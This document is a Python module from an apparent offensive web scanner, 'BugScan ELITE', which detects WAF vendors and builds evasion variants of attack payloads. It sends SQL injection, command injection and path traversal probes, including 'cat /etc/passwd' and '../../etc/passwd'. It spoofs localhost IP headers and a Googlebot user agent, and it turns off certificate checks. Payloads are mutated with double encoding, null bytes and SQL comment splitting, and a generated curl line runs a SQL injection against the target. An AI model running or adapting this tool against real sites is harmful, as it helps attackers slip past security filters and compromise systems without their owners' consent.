"""
BugScan ELITE — WAF Detection & Bypass Engine
Detects WAF vendor, generates bypass strategies per vendor.
"""
import re, time, logging, urllib.request, urllib.parse, ssl, random
from typing import Optional, List, Dict, Tuple

log = logging.getLogger("elite.waf")

WAF_SIGNATURES = {
    "Cloudflare":    ["__cfduid","cf-ray","cloudflare","cf-cache-status","cf-request-id","_cf_bm"],
    "Akamai":        ["akamai","ak_bmsc","bm_sz","x-check-cacheable","x-akamai"],
    "AWS WAF":       ["x-amzn-requestid","x-amz-cf-id","awselb","x-amz-apigw"],
    "Imperva":       ["x-iinfo","x-cdn","incap_ses","visid_incap","imperva"],
    "Sucuri":        ["x-sucuri-id","x-sucuri-cache","sucuri"],
    "F5 BIG-IP":     ["bigipserver","x-wa-info","f5","ts[a-f0-9]{8}"],
    "Barracuda":     ["barra_counter_session","barracuda"],
    "ModSecurity":   ["mod_security","modsecurity","mod security"],
    "Fortinet":      ["fortigate","fortiweb"],
    "Nginx WAF":     ["x-denied-reason","x-waf-event-info"],
    "Wallarm":       ["x-wallarm-node"],
    "Reblaze":       ["x-reblaze"],
    "DataDome":      ["x-datadome","datadome"],
    "PerimeterX":    ["x-px","_pxhd","_pxvid","perimeterx"],
    "Radware":       ["x-rdwr-sid","radware"],
    "DenyAll":       ["sessioncookie","denyall"],
    "Kona":          ["akamai-x-cache","x-check-cacheable"],
}

BYPASS_STRATEGIES = {
    "Cloudflare": [
        "case_randomization",
        "chunked_encoding",
        "unicode_normalization",
        "double_url_encode",
        "null_bytes",
        "header_spoofing",
        "cf_clearance_bypass",
    ],
    "Akamai": [
        "parameter_pollution",
        "json_body",
        "multipart_bypass",
        "case_randomization",
        "header_injection",
    ],
    "AWS WAF": [
        "url_encoding",
        "double_encode",
        "json_nested",
        "parameter_pollution",
        "xml_comments",
    ],
    "Imperva": [
        "chunked_encoding",
        "newline_bypass",
        "double_url_encode",
        "multipart_bypass",
        "unicode_normalization",
    ],
    "ModSecurity": [
        "case_randomization",
        "comment_injection",
        "null_bytes",
        "double_url_encode",
        "whitespace_bypass",
        "inline_comments",
    ],
    "default": [
        "case_randomization",
        "url_encoding",
        "double_url_encode",
        "unicode_normalization",
        "null_bytes",
        "parameter_pollution",
        "chunked_encoding",
        "header_spoofing",
    ],
}

# Header spoofing for WAF bypass
BYPASS_HEADERS = {
    "X-Originating-IP": "127.0.0.1",
    "X-Forwarded-For":  "127.0.0.1",
    "X-Remote-IP":      "127.0.0.1",
    "X-Remote-Addr":    "127.0.0.1",
    "X-Client-IP":      "127.0.0.1",
    "X-Host":           "127.0.0.1",
    "X-Forwarded-Host": "127.0.0.1",
    "X-Custom-IP-Authorization": "127.0.0.1",
    "True-Client-IP":   "127.0.0.1",
    "Cluster-Client-IP":"127.0.0.1",
    "CF-Connecting-IP": "127.0.0.1",
}

def _ctx():
    c = ssl.create_default_context()
    c.check_hostname = False; c.verify_mode = ssl.CERT_NONE
    return c

def _get(url, headers=None, timeout=10):
    try:
        h = {"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1)"}
        if headers: h.update(headers)
        req = urllib.request.Request(url, headers=h)
        with urllib.request.urlopen(req, timeout=timeout, context=_ctx()) as r:
            return r.status, dict(r.headers), r.read(4096).decode("utf-8","ignore")
    except urllib.error.HTTPError as e:
        try: return e.code, dict(e.headers), e.read(512).decode("utf-8","ignore")
        except: return e.code, {}, ""
    except: return None

def detect_waf(url: str) -> Dict:
    """
    Detect WAF vendor and return detection info + bypass strategies.
    """
    result = {
        "detected": False,
        "vendor":   "None",
        "score":    0,
        "evidence": [],
        "strategies": [],
        "bypass_headers": {},
    }

    # First request — normal
    r = _get(url)
    if not r:
        return result

    status, hdrs, body = r
    hdrs_str = " ".join(f"{k}:{v}" for k,v in hdrs.items()).lower()
    body_lower = body.lower()

    # Second request — with payload to trigger WAF
    payload_url = url + "/?id=1'%20OR%201=1--&cmd=cat%20/etc/passwd&file=../../etc/passwd"
    r2 = _get(payload_url)
    blocked_status = r2[0] if r2 else 0
    blocked_hdrs = " ".join(f"{k}:{v}" for k,v in r2[1].items()).lower() if r2 else ""
    blocked_body = r2[2].lower() if r2 else ""

    is_blocked = blocked_status in (403, 406, 429, 503, 999, 400)
    waf_body_sigs = [
        "access denied", "blocked", "forbidden", "security",
        "firewall", "waf", "attack", "illegal", "protection",
        "cloudflare", "incapsula", "akamai", "sucuri",
        "you have been blocked", "request denied",
        "bot protection", "ddos protection",
    ]
    waf_triggered = is_blocked or any(s in blocked_body for s in waf_body_sigs)

    # Detect vendor
    best_vendor = "Unknown"
    best_score = 0

    for vendor, sigs in WAF_SIGNATURES.items():
        score = 0
        evidence = []
        for sig in sigs:
            sig_lower = sig.lower()
            if re.search(sig_lower, hdrs_str) or re.search(sig_lower, body_lower[:500]):
                score += 2
                evidence.append(f"header/body: {sig}")
            if re.search(sig_lower, blocked_hdrs) or re.search(sig_lower, blocked_body[:500]):
                score += 3
                evidence.append(f"waf response: {sig}")
        if score > best_score:
            best_score = score
            best_vendor = vendor
            result["evidence"] = evidence

    if waf_triggered and best_score == 0:
        best_vendor = "Generic WAF"
        best_score = 1
        result["evidence"].append(f"Blocked status: {blocked_status}")

    if best_score > 0 or waf_triggered:
        result["detected"] = True
        result["vendor"] = best_vendor
        result["score"] = best_score
        result["strategies"] = BYPASS_STRATEGIES.get(best_vendor, BYPASS_STRATEGIES["default"])
        # Only use bypass headers if actually blocked
        if is_blocked:
            result["bypass_headers"] = BYPASS_HEADERS
        log.info(f"[waf] detected: {best_vendor} (score={best_score}) at {url}")
    else:
        log.info(f"[waf] no WAF detected at {url}")

    return result


def apply_bypass(payload: str, strategy: str) -> List[str]:
    """
    Apply a bypass strategy to a payload, return list of variants.
    """
    variants = [payload]  # always include original

    if strategy == "case_randomization":
        v = "".join(c.upper() if i % 2 == 0 else c.lower() for i,c in enumerate(payload))
        variants.append(v)

    elif strategy == "url_encoding":
        variants.append(urllib.parse.quote(payload))
        variants.append(urllib.parse.quote(payload, safe=""))

    elif strategy == "double_url_encode":
        v = urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")
        variants.append(v)

    elif strategy == "unicode_normalization":
        replacements = {"'": "%ef%bc%87", '"': "%ef%bc%82",
                        "<": "%ef%bc%9c", ">": "%ef%bc%9e",
                        " ": "%c0%a0",    "/": "%c0%af"}
        v = payload
        for ch, rep in replacements.items():
            v = v.replace(ch, rep)
        variants.append(v)

    elif strategy == "null_bytes":
        variants.append(payload + "%00")
        variants.append("%00" + payload)
        variants.append(payload.replace("'", "'%00'"))

    elif strategy == "comment_injection":
        # SQL comment injection
        v = payload.replace(" ", "/**/")
        variants.append(v)
        v2 = payload.replace("OR", "O/**/R").replace("AND", "A/**/ND")
        variants.append(v2)

    elif strategy == "inline_comments":
        v = payload.replace("UNION", "UN/**/ION").replace("SELECT","SEL/**/ECT")
        variants.append(v)

    elif strategy == "whitespace_bypass":
        for ws in ["%09", "%0a", "%0b", "%0c", "%0d", "%a0", "+"]:
            variants.append(payload.replace(" ", ws))

    elif strategy == "parameter_pollution":
        # Return base payload — caller handles HPP
        variants.append(payload)

    elif strategy == "json_body":
        # Return as JSON-encoded variant
        variants.append(payload.replace("'", r"\u0027").replace('"', r"\u0022"))

    return list(dict.fromkeys(variants))  # deduplicate preserving order


def get_waf_aware_payloads(base_payloads: List[str], waf_info: Dict) -> List[str]:
    """
    Given WAF info, return bypass-enhanced payload list.
    """
    if not waf_info.get("detected"):
        return base_payloads

    strategies = waf_info.get("strategies", [])
    all_payloads = list(base_payloads)

    for payload in base_payloads:
        for strategy in strategies[:4]:  # top 4 strategies
            variants = apply_bypass(payload, strategy)
            all_payloads.extend(v for v in variants if v not in all_payloads)

    return all_payloads


# ── check_waf — returns findings for scanner dispatch ────────────────────────

def check_waf(targets: List[str]) -> List[dict]:
    """
    Detect WAF on each target, return findings with bypass strategies.
    This runs at the start of every scan to inform all other checks.
    """
    findings = []
    for url in targets[:20]:
        try:
            info = detect_waf(url)
            if info["detected"]:
                findings.append({
                    "bug":         "waf",
                    "type":        "waf",
                    "severity":    "info",
                    "url":         url,
                    "title":       f"WAF detected: {info['vendor']}",
                    "description": f"WAF detected: {info['vendor']}",
                    "vendor":      info["vendor"],
                    "score":       info["score"],
                    "evidence":    info["evidence"][:5],
                    "bypass_strategies": info["strategies"],
                    "bypass_headers":    list(info.get("bypass_headers",{}).keys())[:5],
                    "poc": (
                        f"# WAF: {info['vendor']}\n"
                        f"# Top bypass strategies: {info['strategies'][:3]}\n"
                        f"# Bypass headers: X-Forwarded-For: 127.0.0.1\n"
                        f"curl -H 'X-Forwarded-For: 127.0.0.1' \'{url}/?id=1\' OR 1=1--\'"
                    ),
                    "impact":       f"WAF {info['vendor']} is blocking attacks — use bypass strategies",
                    "remediation":  "Update WAF rules. Enable bot detection. Enable rate limiting.",
                })
        except: pass
    log.info(f"[waf_check] {len(findings)} WAFs detected")
    return findings


def get_waf_bypass_headers(url: str) -> Dict:
    """Quick WAF detection returning bypass headers for other checks."""
    try:
        info = detect_waf(url)
        if info["detected"]:
            log.info(f"[waf] {info['vendor']} detected — using bypass headers")
            return info.get("bypass_headers", {})
    except: pass
    return {}
